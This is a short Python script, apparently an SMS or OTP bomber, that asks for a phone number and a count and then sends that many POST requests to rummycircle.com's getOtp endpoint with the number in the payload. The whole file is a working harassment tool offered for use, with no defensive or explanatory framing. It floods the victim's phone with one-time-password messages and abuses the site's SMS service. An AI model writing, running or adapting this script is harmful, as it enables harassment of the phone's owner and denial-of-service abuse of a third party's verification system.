import json
import requests
num=input("enter the number :")
req=int(input("enter the number of request to be send :"))
url = 'https://www.rummycircle.com/api/fl/auth/v3/getOtp'
headers = {'Content-Type': 'application/json'}
payload = {"mobile":num,"deviceId":"e6abe4d3-b210-4a5a-aa99-41a04b3fbd90","deviceName":"","refCode":"","isPlaycircle":False}

for i in range(req):
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    print(response.status_code)
